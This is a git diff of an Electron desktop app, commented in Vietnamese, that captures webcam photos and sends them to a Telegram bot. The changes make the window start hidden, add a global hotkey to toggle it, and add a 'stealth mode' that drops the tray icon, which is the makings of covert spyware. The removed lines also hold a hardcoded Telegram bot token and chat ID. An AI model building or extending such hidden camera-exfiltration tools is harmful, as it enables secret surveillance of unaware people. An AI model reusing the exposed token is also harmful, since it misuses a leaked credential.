@@ -1,5 +1,7 @@
-const BOT_TOKEN = process.env.BOT_TOKEN || "8150844013:AAFTyAAo81bPYlWPmCvpLsvW_B-gaAZcvtk";
-const CHAT_ID = process.env.CHAT_ID || "6918162210";
+require('dotenv').config();
+
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
 const { app, BrowserWindow, session, Tray, Menu, ipcMain } = require('electron');
 const path = require('path');
@@ -20,6 +22,9 @@ if (app.isPackaged) {
 console.log("FFmpeg path:", ffmpegPath);
 console.log("Exists:", fs.existsSync(ffmpegPath));
 
+const { globalShortcut } = require('electron');
+const store = require('./config');
+
 let win;
 let tray;
 
@@ -27,7 +32,6 @@ ipcMain.on('send-photo', async (event, base64Image) => {
   try {
     const token = BOT_TOKEN;
     const chatId = CHAT_ID;
-
     const base64Data = base64Image.replace(/^data:image\/png;base64,/, "");
     const buffer = Buffer.from(base64Data, "base64");
 
@@ -112,7 +116,7 @@ function createWindow() {
   win = new BrowserWindow({
     width: 800,
     height: 600,
-    show: true, // không hiện lúc start
+    show: false, // không hiện lúc start
     webPreferences: {
       preload: path.join(__dirname, "preload.js"),
       contextIsolation: true,
@@ -120,7 +124,7 @@ function createWindow() {
     }
   });
 
-  win.loadFile('index.html');
+  win.loadFile('src/index.html');
 
   win.on('close', (event) => {
     if (!app.isQuiting) {
@@ -145,36 +149,81 @@ app.whenReady().then(() => {
 
   createWindow();
 
-  const iconPath = path.join(__dirname, 'icon.png');
+  const hotkey = store.get('hotkey');
+  console.log(`Dang thu dang ky hotkey: ${hotkey}`)
 
-  if (fs.existsSync(iconPath)) {
+  const ret = globalShortcut.register(hotkey, () => {
+    console.log(`Hotkey ${hotkey}`);
 
-    tray = new Tray(iconPath);
+    if (win.isVisible()) {
+      win.hide();
 
-    const contextMenu = Menu.buildFromTemplate([
-      {
-        label: 'Mở lại',
-        click: () => {
-          if (win) win.show();
-        }
-      },
-      {
-        label: 'Thoát',
-        click: () => {
-          app.isQuiting = true;
-          app.quit();
-        }
-      }
-    ]);
+      console.log('Cua so da an')
+    } else {
+      win.show();
+      win.focus(); // Đưa lên foreground
 
-    tray.setToolTip('Camera App đang chạy');
-    tray.setContextMenu(contextMenu);
+      console.log('Cua so da hien')
+    }
+  });
 
+  if (!ret) {
+    console.error(`Dang ky hotkey that bai: ${hotkey}`)
+    console.error('Ly do co the do hotkey bi chiem o ung dung khac! Thu thay doi trong config.json');
+
+    if (win && win.isVisible()) {
+      win.webContents.executeJavaScript(`alert("Hotkey ${hotkey} khong dang ky duoc")`)
+    }
   } else {
-    console.warn("Icon not found:", iconPath);
+    console.log(`Hotkey ${hotkey} da duoc dang ky thanh cong`)
   }
 
+  const isStealth = store.get('stealthMode');
+
+  if (!isStealth) {
+    // Chỉ tạo tray nếu không ở stealth mode
+    let iconPath;
+
+    if (app.isPackaged) {
+      iconPath = path.join(process.resourcesPath, 'public', 'trayicon.ico');
+    } else {
+      iconPath = path.join(__dirname, '..', 'public', 'trayicon.ico');
+    }
+
+
+    if (fs.existsSync(iconPath)) {
+
+      tray = new Tray(iconPath);
+
+      const contextMenu = Menu.buildFromTemplate([
+        {
+          label: 'Mở lại',
+          click: () => {
+            if (win) win.show();
+          }
+        },
+        {
+          label: 'Thoát',
+          click: () => {
+            app.isQuiting = true;
+            app.quit();
+          }
+        }
+      ]);
+
+      tray.setToolTip('Webcam is running');
+      tray.setContextMenu(contextMenu);
+
+    }
+  } else {
+    console.warn('Chay o Full Steal Mode - Khong tray Icon');
+  }
 });
+
+// Cleanup hotkey khi thoát
+app.on('will-quit', () => {
+  globalShortcut.unregisterAll();
+})
 
 app.on('window-all-closed', (e) => {
   e.preventDefault();
